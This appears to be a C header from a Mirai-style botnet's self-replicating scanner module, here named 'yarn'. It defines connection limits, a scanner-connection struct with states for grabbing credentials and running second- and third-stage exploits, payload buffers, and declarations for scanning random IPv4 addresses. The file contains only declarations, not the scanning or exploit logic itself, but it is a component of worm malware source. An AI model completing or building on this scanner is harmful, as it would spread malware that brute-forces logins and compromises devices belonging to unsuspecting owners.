#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef X86_64
#define yarn_SCANNER_MAX_CONNS 512
#define yarn_SCANNER_RAW_PPS 1440
#else
#define yarn_SCANNER_MAX_CONNS 128
#define yarn_SCANNER_RAW_PPS 160
#endif
#ifdef X86_64
#define yarn_SCANNER_RDBUF_SIZE 1024
#define yarn_SCANNER_HACK_DRAIN 64
#else
#define yarn_SCANNER_RDBUF_SIZE 256
#define yarn_SCANNER_HACK_DRAIN 64
#endif

struct yarn_scanner_connection
{
    int fd, last_recv;
    enum
    {
        yarn_SC_CLOSED,
        yarn_SC_CONNECTING,
        yarn_SC_GET_CREDENTIALS,
        yarn_SC_EXPLOIT_STAGE2,
        yarn_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[yarn_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[2560], payload_buf2[2560];
    int credential_index;
};

void yarn_init();
void yarn_kill(void);

static void yarn_setup_connection(struct yarn_scanner_connection *);
static ipv4_t get_random_ip(void);

#endif
